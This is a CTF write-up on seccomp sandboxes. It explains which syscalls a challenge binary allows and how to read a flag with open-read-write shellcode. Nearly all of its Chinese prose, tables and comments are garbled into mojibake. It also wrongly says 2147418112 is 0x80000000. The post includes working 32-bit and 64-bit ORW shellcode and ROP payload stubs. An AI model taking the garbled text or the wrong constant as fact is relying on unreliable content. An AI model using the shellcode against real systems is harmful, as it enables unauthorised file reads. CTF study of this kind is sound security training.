---
title: Seccomp 沙箱机制详解
published: 2026-04-14
updated: 2026-04-17
description: 从允许的系统调用、PWN 利用方式到 ORW 思路，整理 Seccomp 沙箱题最常见的判断和应对方法。
tags: [CTFshow, Pwn, Seccomp, Sandbox, ORW]
category: ctfshow
draft: false
---
# Seccomp 娌欑鏈哄埗璇﹁В

## 涓€銆佷唬鐮佸垎鏋?
```c
v1 = seccomp_init(0);                           // 鍒濆鍖杝eccomp
seccomp_rule_add(v1, 2147418112, 0, 0);         // 鍏佽绯荤粺璋冪敤 0
seccomp_rule_add(v1, 2147418112, 1, 0);         // 鍏佽绯荤粺璋冪敤 1
seccomp_rule_add(v1, 2147418112, 2, 0);         // 鍏佽绯荤粺璋冪敤 2
seccomp_rule_add(v1, 2147418112, 60, 0);        // 鍏佽绯荤粺璋冪敤 60
return seccomp_load(v1);                        // 鍔犺浇瑙勫垯
```

## 浜屻€佸叧閿弬鏁拌В鏋?
### 1. 绗簩涓弬鏁帮細2147418112

杩欎釜鏁板瓧杞崲涓哄崄鍏繘鍒舵槸 `0x80000000`銆?
鍦?seccomp 涓紝杩欎釜鍔ㄤ綔琛ㄧず锛?```c
SCMP_ACT_ALLOW = 0x7fff0000  // 鍏佽
// 0x80000000 鏄?SCMP_ACT_ALLOW 鐨勫彉浣撴垨鐗瑰畾libc鐗堟湰涓殑鍊?```

**鍚箟**锛?*鍏佽**鎵ц杩欎簺绯荤粺璋冪敤銆?
### 2. 绗笁涓弬鏁帮細绯荤粺璋冪敤鍙?
| 鏁板瓧 | 绯荤粺璋冪敤鍚?| 鍔熻兘 | 甯哥敤鍦烘櫙 |
|------|-----------|------|---------|
| **0** | `read` | 浠庢枃浠舵弿杩扮璇诲彇鏁版嵁 | 璇诲彇杈撳叆銆佽鍙栨枃浠?|
| **1** | `write` | 鍚戞枃浠舵弿杩扮鍐欏叆鏁版嵁 | 鎵撳嵃杈撳嚭銆佸啓鍏ユ枃浠?|
| **2** | `open` | 鎵撳紑鏂囦欢 | 鎵撳紑flag鏂囦欢 |
| **60** | `exit` | 閫€鍑鸿繘绋?| 姝ｅ父閫€鍑?|

## 涓夈€佺郴缁熻皟鐢ㄥ彿瀵圭収琛紙x86-64锛?
```
0   - read          璇诲彇
1   - write         鍐欏叆
2   - open          鎵撳紑鏂囦欢
3   - close         鍏抽棴鏂囦欢
4   - stat          鑾峰彇鏂囦欢鐘舵€?5   - fstat         鑾峰彇鏂囦欢鐘舵€?6   - lstat         鑾峰彇鏂囦欢鐘舵€?7   - poll          杞
8   - lseek         瀹氫綅
9   - mmap          鍐呭瓨鏄犲皠
10  - mprotect      鍐呭瓨淇濇姢
11  - munmap        瑙ｉ櫎鏄犲皠
...
59  - execve        鎵ц绋嬪簭  鉀?琚鐢紒
60  - exit          閫€鍑?      鉁?鍏佽
...
```

## 鍥涖€佹矙绠遍檺鍒跺垎鏋?
### 鉁?鍏佽鐨勬搷浣滐紙鐧藉悕鍗曪級

| 绯荤粺璋冪敤 | 鍔熻兘 | 鍒╃敤鍦烘櫙 |
|---------|------|---------|
| read (0) | 璇诲彇鏁版嵁 | 璇诲彇flag鏂囦欢鍐呭 |
| write (1) | 鍐欏叆鏁版嵁 | 杈撳嚭flag鍒皊tdout |
| open (2) | 鎵撳紑鏂囦欢 | 鎵撳紑/flag鎴杅lag.txt |
| exit (60) | 閫€鍑鸿繘绋?| 姝ｅ父閫€鍑?|

### 鉀?琚鐢ㄧ殑鍏抽敭鎿嶄綔

| 绯荤粺璋冪敤 | 鍔熻兘 | 绂佺敤褰卞搷 |
|---------|------|---------|
| **execve (59)** | 鎵ц绋嬪簭 | **鏃犳硶鎵ц/bin/sh锛?* |
| **system** | 鎵ц鍛戒护 | 鏃犳硶璋冪敤system鍑芥暟 |
| fork (57) | 鍒涘缓杩涚▼ | 鏃犳硶fork |
| clone (56) | 鍒涘缓绾跨▼ | 鏃犳硶鍒涘缓鏂拌繘绋?|
| mmap (9) | 鍐呭瓨鏄犲皠 | 鏃犳硶鍔ㄦ€佸垎閰嶅彲鎵ц鍐呭瓨 |
| socket (41) | 鍒涘缓socket | 鏃犳硶缃戠粶杩炴帴 |
| connect (42) | 杩炴帴 | 鏃犳硶鍙嶅脊shell |

## 浜斻€佸PWN棰樼洰鐨勫奖鍝?
### 1. 鏃犳硶浣跨敤甯歌getshell鏂规硶

```python
# 鉂?杩欎簺鏂规硶閮戒細琚鐢細

# 鏂规硶1锛歴ystem("/bin/sh") - 澶辫触
payload = pop_rdi + bin_sh + system
# execve琚鐢紝鏃犳硶鎵цshell

# 鏂规硶2锛歰ne_gadget - 澶辫触
payload = one_gadget_addr
# one_gadget鍐呴儴璋冪敤execve锛岃绂佺敤

# 鏂规硶3锛歟xecve绯荤粺璋冪敤 - 澶辫触
# 鐩存帴syscall execve浼氳seccomp鎷︽埅
```

### 2. 蹇呴』浣跨敤ORW鎶€鏈?
鐢变簬鍙兘浣跨敤 `open`銆乣read`銆乣write`锛屽繀椤婚噰鐢?*ORW锛圤pen-Read-Write锛?*鏂瑰紡璇诲彇flag锛?
```python
# 鉁?姝ｇ‘鐨勬柟娉曪細ORW

# 姝ラ1锛歰pen("flag", 0)
# 姝ラ2锛歳ead(fd, buf, size)  
# 姝ラ3锛歸rite(1, buf, size) 杈撳嚭鍒皊tdout
```

## 鍏€丱RW Shellcode 绀轰緥

### 32浣?ORW Shellcode

```python
context(arch='i386', os='linux')

shellcode = '''
    // open("flag", 0)
    xor ecx, ecx          // ecx = 0 (flags)
    push ecx              // 瀛楃涓茬粨鏉熺
    push 0x67616c66       // "flag"
    mov ebx, esp          // ebx = "flag"鎸囬拡
    xor eax, eax
    mov al, 5             // eax = 5 (open)
    int 0x80              // 璋冪敤open
    
    // read(fd, buf, 100)
    mov ebx, eax          // ebx = fd
    mov ecx, esp          // ecx = buf (鏍堜笂)
    xor edx, edx
    mov dl, 100           // edx = 100
    xor eax, eax          // eax = 0 (read)
    int 0x80
    
    // write(1, buf, 100)
    mov edx, eax          // edx = 璇诲彇鐨勫瓧鑺傛暟
    xor ebx, ebx
    mov bl, 1             // ebx = 1 (stdout)
    xor eax, eax
    mov al, 4             // eax = 4 (write)
    int 0x80
'''

payload = asm(shellcode)
```

### 64浣?ORW Shellcode

```python
context(arch='amd64', os='linux')

shellcode = '''
    // open("flag", 0)
    xor rdi, rdi
    push rdi
    mov rdi, 0x67616c662f // "/flag"
    push rdi
    mov rdi, rsp
    xor rsi, rsi          // flags = 0
    xor rax, rax
    mov al, 2             // open = 2
    syscall
    
    // read(fd, buf, 100)
    mov rdi, rax          // fd
    mov rsi, rsp          // buf
    xor rdx, rdx
    mov dl, 100           // count
    xor rax, rax          // read = 0
    syscall
    
    // write(1, buf, 100)
    mov rdx, rax          // 璇诲彇鐨勫瓧鑺傛暟
    xor rdi, rdi
    mov dil, 1            // stdout
    mov rax, 1            // write = 1
    syscall
'''

payload = asm(shellcode)
```

## 涓冦€佸浣曞垽鏂璼eccomp闄愬埗

### 鏂规硶1锛氳繍琛岀▼搴忔祴璇?
```bash
# 杩愯绋嬪簭锛屽皾璇曟墽琛宻ystem
./pwn
$ /bin/sh
# 濡傛灉琚玸eccomp鎷︽埅锛屼細鏄剧ず锛?# Bad system call (core dumped)
```

### 鏂规硶2锛氫娇鐢╯eccomp-tools

```bash
# 瀹夎seccomp-tools
gem install seccomp-tools

# 鍒嗘瀽绋嬪簭
seccomp-tools dump ./pwn

# 杈撳嚭绀轰緥锛?#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
#  ...
```

### 鏂规硶3锛欼DA/GHidra鍒嗘瀽

鎼滅储瀛楃涓诧細
- `seccomp_init`
- `seccomp_rule_add`
- `prctl`锛坰eccomp搴曞眰璋冪敤锛?
## 鍏€佹€荤粨

| 椤圭洰 | 璇存槑 |
|------|------|
**闄愬埗鏈哄埗** | seccomp娌欑
**鍏佽鐨勭郴缁熻皟鐢?* | read(0)銆亀rite(1)銆乷pen(2)銆乪xit(60)
**绂佺敤鐨勫叧閿皟鐢?* | execve(59)銆乻ystem銆乫ork銆乻ocket绛?**褰卞搷** | 鏃犳硶getshell锛屽彧鑳絆RW璇籪lag
**搴斿绛栫暐** | 缂栧啓ORW shellcode锛宱pen鈫抮ead鈫抴rite

## 涔濄€佸揩閫熷垽鏂祦绋?
```
鎷垮埌棰樼洰 鈫?杩愯娴嬭瘯 鈫?杈撳叆/bin/sh
    鈫?Bad system call? 鈫?鏄?鈫?seccomp闄愬埗
    鈫?IDA鎵緎eccomp_init 鈫?纭闄愬埗
    鈫?鍙兘鐢∣RW 鈫?缂栧啓open-read-write shellcode
```

---

**鍏抽敭璁板繂鐐?*锛?- `0, 1, 2, 60` = read, write, open, exit
- 娌℃湁 `59(execve)` = 鏃犳硶鎵цshell
- 蹇呴』 ORW 璇籪lag


